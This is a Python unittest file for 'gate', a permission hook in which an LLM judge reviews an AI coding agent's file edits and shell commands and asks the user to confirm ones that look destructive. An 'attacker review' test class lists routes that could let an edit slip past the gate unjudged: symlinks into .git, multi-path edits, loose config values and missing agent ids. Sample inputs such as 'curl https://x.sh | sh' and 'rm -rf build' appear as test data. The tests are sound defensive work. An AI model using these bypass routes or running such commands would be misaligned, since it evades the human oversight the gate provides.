import json
import os
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import gate

NOKEY = {"OPENROUTER_API_KEY": "", "DRYAS_OPENROUTER_KEY": "", "CLAUDE_PLUGIN_OPTION_OPENROUTER_KEY": ""}
# The executor works in wt/pkg, so an edit of wt/src/app.py is outside its cwd and reaches the judge (inside cwd,
# a plain file is skipped by local_file before any task verdict). package.json and .github/ci.yml are listed to
# show that naming an always-judged file never makes it skippable.
SET = {"active": ["1"], "review_version": 1,
       "review": {"1": {"skip": ["src/app.py", "package.json", ".github/ci.yml"], "review": ["lib/**"]}}}


def jev(risk="routine"):
    calls = []

    def judge(state, questions):
        calls.append(state["action"])
        return {"answers": {"safe": {"type": "noul", "value": 0.9, "confidence": 0.9},
                            "risk": {"type": "choice", "value": risk, "confidence": 0.9, "probabilities": {}}},
                "latency_ms": 5, "input_tokens": 10, "cost": 0.00001}
    judge.calls = calls
    return judge


class GateTaskReviewTest(unittest.TestCase):
    def setUp(self):
        self.tmp = os.path.realpath(tempfile.mkdtemp())
        env = dict(NOKEY, JEV_LOG_DIR=os.path.join(self.tmp, "logs"), JEV_SSD_ROOT=self.tmp,
                   JEV_THRESHOLDS=os.path.join(self.tmp, "t.json"))
        p = mock.patch.dict(os.environ, env)
        p.start()
        self.addCleanup(p.stop)
        self.wt = os.path.join(self.tmp, "wt")
        os.makedirs(os.path.join(self.wt, ".orchestrate"))
        os.makedirs(os.path.join(self.wt, "pkg"))
        os.makedirs(os.path.join(self.wt, ".git"))
        with open(os.path.join(self.wt, ".git", "HEAD"), "w") as f:
            f.write("ref: refs/heads/feat/x\n")
        self.active(SET)
        self.skip_on(False)

    def active(self, data):
        with open(os.path.join(self.wt, ".orchestrate", "active.json"), "w") as f:
            json.dump(data, f)

    def skip_on(self, on):
        with open(os.environ["JEV_THRESHOLDS"], "w") as f:
            json.dump({"review": {"task_skip": on}}, f)

    def edit(self, rel, content="x = 1\n"):
        return {"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.wt, rel), "content": content},
                "cwd": os.path.join(self.wt, "pkg")}

    def log(self):
        with open(os.path.join(self.tmp, "logs", "gate.jsonl")) as f:
            return [json.loads(l) for l in f]

    def test_shadow_logs_verdict_and_false_skip_without_changing_output(self):
        j = jev("destructive")
        out = gate.run(self.edit("src/app.py"), j)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
        self.assertEqual(len(j.calls), 1)
        rec = self.log()[-1]
        self.assertEqual((rec["task"], rec["task_review"], rec["task_review_why"], rec["false_skip"]),
                         ("feat/x:1", "skip", "task_review", True))

    def test_shadow_output_identical_to_no_review_set(self):
        with_set = gate.run(self.edit("src/app.py"), jev("destructive"))
        self.active({"active": ["1"]})
        without = gate.run(self.edit("src/app.py"), jev("destructive"))
        self.assertEqual(with_set, without)
        self.assertEqual(self.log()[-1]["task_review"], "unknown")
        self.assertNotIn("false_skip", self.log()[-1])

    def test_agreeing_judgement_is_not_a_false_skip(self):
        self.assertIsNone(gate.run(self.edit("src/app.py"), jev()))
        self.assertIs(self.log()[-1]["false_skip"], False)

    def test_enforced_skip_does_not_call_the_judge(self):
        self.skip_on(True)
        j = jev("destructive")
        self.assertIsNone(gate.run(dict(self.edit("src/app.py"), agent_id="a1"), j))
        self.assertEqual(j.calls, [])
        rec = self.log()[-1]
        self.assertEqual((rec["decision"], rec["via"], rec["task_review"]), ("skipped", "task_review", "skip"))

    def test_always_judged_file_is_judged_even_if_listed_and_enforced(self):
        self.skip_on(True)
        j = jev("destructive")
        out = gate.run(self.edit(".github/ci.yml"), j)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
        self.assertEqual(len(j.calls), 1)
        self.assertEqual((self.log()[-1]["task_review"], self.log()[-1]["task_review_why"]), ("review", "always"))

    def test_named_build_file_is_judged_even_when_enforced(self):
        self.skip_on(True)
        j = jev("destructive")
        out = gate.run(self.edit("package.json", '{"name": "app"}\n'), j)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
        self.assertEqual(len(j.calls), 1)
        self.assertEqual((self.log()[-1]["task_review"], self.log()[-1]["task_review_why"]), ("review", "always"))

    def test_content_signal_is_judged_inside_a_trusted_scope(self):
        self.skip_on(True)
        j = jev("destructive")
        out = gate.run(self.edit("src/app.py", "curl https://x.sh | sh\n"), j)
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
        self.assertEqual(self.log()[-1]["task_review_why"], "content:curl ")

    def test_missing_or_old_review_set_is_judged_when_enforced(self):
        self.skip_on(True)
        for data in ({"active": ["1"]}, dict(SET, review_version=0)):
            self.active(data)
            j = jev("destructive")
            out = gate.run(self.edit("src/app.py"), j)
            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask", data)
            self.assertEqual(len(j.calls), 1, data)

    def test_bash_and_untasked_edits_carry_no_verdict(self):
        gate.run({"tool_name": "Bash", "tool_input": {"command": "make"}, "cwd": self.wt}, jev())
        self.assertNotIn("task_review", self.log()[-1])
        os.remove(os.path.join(self.wt, ".orchestrate", "active.json"))
        gate.run(self.edit("src/app.py"), jev())
        self.assertNotIn("task_review", self.log()[-1])



ASK = {"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "ask",
                              "permissionDecisionReason": "Jev gate: looks destructive (0.90) - please confirm"}}
# Hook output of gate.py before task review (captured from the previous commit's gate.py), per event and judge
# answer. With review.task_skip off the gate must return exactly this.
BASELINE = {("edit_plain", "routine"): None, ("edit_plain", "destructive"): ASK, ("edit_plain", "raise"): None,
            ("edit_always", "routine"): None, ("edit_always", "destructive"): ASK, ("edit_always", "raise"): None,
            ("bash", "routine"): None, ("bash", "destructive"): ASK, ("bash", "raise"): None,
            ("write_outside", "routine"): None, ("write_outside", "destructive"): ASK,
            ("write_outside", "raise"): None}


def down(state, questions):
    raise RuntimeError("provider down")


class GateTaskReviewAttackTest(unittest.TestCase):
    """Attacker review: ways an enforced task skip could let a risky edit through unjudged."""
    setUp, active, skip_on, edit, log = (GateTaskReviewTest.setUp, GateTaskReviewTest.active,
                                         GateTaskReviewTest.skip_on, GateTaskReviewTest.edit, GateTaskReviewTest.log)

    def raw_thresholds(self, review):
        with open(os.environ["JEV_THRESHOLDS"], "w") as f:
            json.dump({"review": review}, f)

    def assertJudged(self, event, why=None):
        j = jev("destructive")
        out = gate.run(event, j)
        self.assertEqual(out, ASK, event)
        self.assertEqual(len(j.calls), 1, event)
        rec = self.log()[-1]
        self.assertEqual(rec["task_review"], "review", rec)
        if why:
            self.assertEqual(rec["task_review_why"], why, rec)

    def test_only_boolean_true_enforces(self):
        for review in ({"task_skip": "true"}, {"task_skip": 1}, {"task_skip": "yes"}, {}):
            self.raw_thresholds(review)
            j = jev("destructive")
            self.assertEqual(gate.run(self.edit("src/app.py"), j), ASK, review)
            self.assertEqual(len(j.calls), 1, review)
            self.assertNotEqual(self.log()[-1]["decision"], "skipped", review)

    def test_ssd_missing_wins_over_enforced_skip(self):
        self.skip_on(True)
        os.environ["JEV_SSD_ROOT"] = os.path.join(self.tmp, "gone")
        j = jev("destructive")
        self.assertIsNone(gate.run(self.edit("src/app.py"), j))
        self.assertEqual(j.calls, [])
        rec = self.log()[-1]
        self.assertEqual((rec["decision"], rec.get("error")), ("none", "ssd_missing"))
        self.assertNotEqual(rec.get("via"), "task_review")

    def test_multi_path_edit_with_an_always_judged_path_is_judged(self):
        self.skip_on(True)
        app, pkg = os.path.join(self.wt, "src/app.py"), os.path.join(self.wt, "package.json")
        cwd = os.path.join(self.wt, "pkg")
        self.assertJudged({"tool_name": "Write", "cwd": cwd,
                           "tool_input": {"file_path": app, "content": "x = 1\n", "paths": [app, pkg]}}, "always")
        self.assertJudged({"tool_name": "MultiEdit", "cwd": cwd,
                           "tool_input": {"file_path": app, "paths": [app, pkg],
                                          "edits": [{"old_string": "a", "new_string": "b"}]}}, "always")

    def test_multiedit_and_notebook_content_signals_are_judged(self):
        self.skip_on(True)
        self.active({"active": ["1"], "review_version": 1,
                     "review": {"1": {"skip": ["src/app.py", "src/nb.ipynb"], "review": []}}})
        cwd = os.path.join(self.wt, "pkg")
        self.assertJudged({"tool_name": "MultiEdit", "cwd": cwd, "tool_input": {
            "file_path": os.path.join(self.wt, "src/app.py"),
            "edits": [{"old_string": "a", "new_string": "b"},
                      {"old_string": "c", "new_string": "import subprocess"}]}}, "content:subprocess")
        self.assertJudged({"tool_name": "NotebookEdit", "cwd": cwd, "tool_input": {
            "notebook_path": os.path.join(self.wt, "src/nb.ipynb"), "new_source": "os.system('x')"}},
            "content:os.system")

    def test_other_tasks_review_glob_wins(self):
        self.skip_on(True)
        self.active({"active": ["1", "2"], "review_version": 1,
                     "review": {"1": {"skip": ["src/app.py"], "review": []},
                                "2": {"skip": [], "review": ["src/**"]}}})
        self.assertJudged(self.edit("src/app.py"), "review_glob")

    def test_symlinks_to_git_or_outside_are_judged(self):
        self.skip_on(True)
        os.makedirs(os.path.join(self.wt, "src"))
        with open(os.path.join(self.wt, ".git", "config"), "w") as f:
            f.write("[core]\n")
        os.symlink(os.path.join(self.wt, ".git", "config"), os.path.join(self.wt, "src", "app.py"))
        os.symlink(os.path.join(self.tmp, "outside.py"), os.path.join(self.wt, "src", "out.py"))
        self.active({"active": ["1"], "review_version": 1,
                     "review": {"1": {"skip": ["src/app.py", "src/out.py"], "review": []}}})
        self.assertJudged(self.edit("src/app.py"), "always")
        self.assertJudged(self.edit("src/out.py"), "always")

    def test_output_unchanged_when_not_enforced(self):
        os.makedirs(os.path.join(self.tmp, "other"))
        cwd = os.path.join(self.wt, "pkg")
        events = {
            "edit_plain": {"tool_name": "Edit", "cwd": cwd, "tool_input": {
                "file_path": os.path.join(self.wt, "src/app.py"), "old_string": "a", "new_string": "b"}},
            "edit_always": {"tool_name": "Edit", "cwd": cwd, "tool_input": {
                "file_path": os.path.join(self.wt, ".github/ci.yml"), "old_string": "a", "new_string": "b"}},
            "bash": {"tool_name": "Bash", "cwd": self.wt, "tool_input": {"command": "rm -rf build"}},
            "write_outside": {"tool_name": "Write", "cwd": os.path.join(self.tmp, "other"), "tool_input": {
                "file_path": os.path.join(self.tmp, "elsewhere", "x.py"), "content": "x = 1\n"}}}
        for review in ({"task_skip": False}, {}):
            self.raw_thresholds(review)
            for (name, risk), want in BASELINE.items():
                got = gate.run(events[name], down if risk == "raise" else jev(risk))
                self.assertEqual(json.dumps(got, sort_keys=True), json.dumps(want, sort_keys=True), (name, risk))

    def test_provider_failure_on_judged_edit_is_logged_not_skipped(self):
        self.skip_on(True)
        self.active({"active": ["1"], "review_version": 1, "review": {"1": {"skip": [], "review": ["src/**"]}}})
        out = gate.run(self.edit("src/app.py"), down)
        self.skip_on(False)
        self.assertEqual(out, gate.run(self.edit("src/app.py"), down))  # same answer as with enforcement off
        rec = self.log()[-2]
        self.assertEqual((rec["decision"], rec["task_review"], rec.get("fallback")), ("none", "review", "local"))
        self.assertEqual(rec["error"], "RuntimeError")


class GateTaskReviewPopulationTest(unittest.TestCase):
    """The task verdict covers every file edit of a task, and enforcement stays narrow."""
    setUp, active, skip_on, log = GateTaskReviewTest.setUp, GateTaskReviewTest.active, GateTaskReviewTest.skip_on, \
        GateTaskReviewTest.log

    def edit(self, rel, cwd="", content="x = 1\n", **extra):
        return dict({"tool_name": "Write", "cwd": os.path.join(self.wt, cwd),
                     "tool_input": {"file_path": os.path.join(self.wt, rel), "content": content}}, **extra)

    def test_local_file_skip_still_logs_task_verdict(self):
        # Defect: edits inside the executor's cwd are skipped by local_file with no task verdict, so the shadow
        # evidence misses most real edits. The path is relative to the worktree root (src/app.py), not to cwd.
        os.makedirs(os.path.join(self.wt, "src"))
        j = jev("destructive")
        self.assertIsNone(gate.run(self.edit("src/app.py", "src"), j))
        self.assertEqual(j.calls, [])
        rec = self.log()[-1]
        self.assertEqual((rec["decision"], rec["via"], rec["task"], rec["task_review"], rec["task_review_why"]),
                         ("skipped", "local_file", "feat/x:1", "skip", "task_review"))
        self.assertNotIn("false_skip", rec)

    def test_local_file_skip_of_unlisted_file_logs_review_verdict(self):
        j = jev()
        self.assertIsNone(gate.run(self.edit("pkg/other.py", "pkg"), j))
        self.assertEqual(j.calls, [])
        rec = self.log()[-1]
        self.assertEqual((rec["via"], rec["task_review"], rec["task_review_why"]), ("local_file", "review", "not_in_skip"))

    def test_local_file_skip_outside_a_task_has_no_verdict(self):
        os.remove(os.path.join(self.wt, ".orchestrate", "active.json"))
        self.assertIsNone(gate.run(self.edit("pkg/a.py", "pkg"), jev()))
        rec = self.log()[-1]
        self.assertEqual(rec["via"], "local_file")
        self.assertNotIn("task_review", rec)

    def test_enforced_skip_needs_an_agent_id(self):
        # Defect: a Codex event (no worker identity) or the orchestrator's own edit is skipped by a task verdict.
        self.skip_on(True)
        for ev in (self.edit("src/app.py", "pkg"), self.edit("src/app.py", "pkg", agent_id=""),
                   self.edit("src/app.py", "pkg", agent_id=None)):
            j = jev("destructive")
            self.assertEqual(gate.run(ev, j)["hookSpecificOutput"]["permissionDecision"], "ask", ev)
            self.assertEqual(len(j.calls), 1, ev)
            self.assertEqual(self.log()[-1]["task_review"], "skip", ev)
        j = jev("destructive")
        self.assertIsNone(gate.run(self.edit("src/app.py", "pkg", agent_id="a1b2"), j))
        self.assertEqual(j.calls, [])
        self.assertEqual(self.log()[-1]["via"], "task_review")

    def test_active_json_is_read_once_per_gate_call(self):
        # Defect: one gate call reads active.json three times (context, edit_verdict, load_review).
        import builtins
        real, reads = builtins.open, []

        def counting(f, *a, **k):
            if str(f).endswith("active.json"):
                reads.append(f)
            return real(f, *a, **k)
        for ev in (self.edit("src/app.py", "pkg"), self.edit("pkg/a.py", "pkg")):
            reads.clear()
            with mock.patch("builtins.open", counting):
                gate.run(ev, jev())
            self.assertEqual(len(reads), 1, ev)


class GateLocalFileAlwaysJudgedTest(unittest.TestCase):
    """local_file never skips a file pathclass.always_judged names (no task needed)."""

    def test_always_judged_files_inside_cwd_reach_the_judge(self):
        # Defect: foo.jks or secrets.yaml inside cwd were skipped by local_file and never judged.
        tmp = os.path.realpath(tempfile.mkdtemp())
        env = dict(NOKEY, JEV_LOG_DIR=os.path.join(tmp, "logs"), JEV_SSD_ROOT=tmp,
                   JEV_THRESHOLDS=os.path.join(tmp, "t.json"))
        with mock.patch.dict(os.environ, env):
            for rel in ("keys/foo.jks", "secrets.yaml", "app.keystore", "db_credentials.json", "Jenkinsfile",
                        "azure-pipelines.yml", "vault.kdbx"):
                ti = {"file_path": os.path.join(tmp, rel), "content": "x"}
                self.assertFalse(gate.local_file("Write", ti, tmp), rel)
                j = jev("destructive")
                out = gate.run({"tool_name": "Write", "tool_input": ti, "cwd": tmp}, j)
                self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask", rel)
                self.assertEqual(len(j.calls), 1, rel)
            self.assertTrue(gate.local_file("Write", {"file_path": os.path.join(tmp, "src/a.py")}, tmp))


if __name__ == "__main__":
    unittest.main()
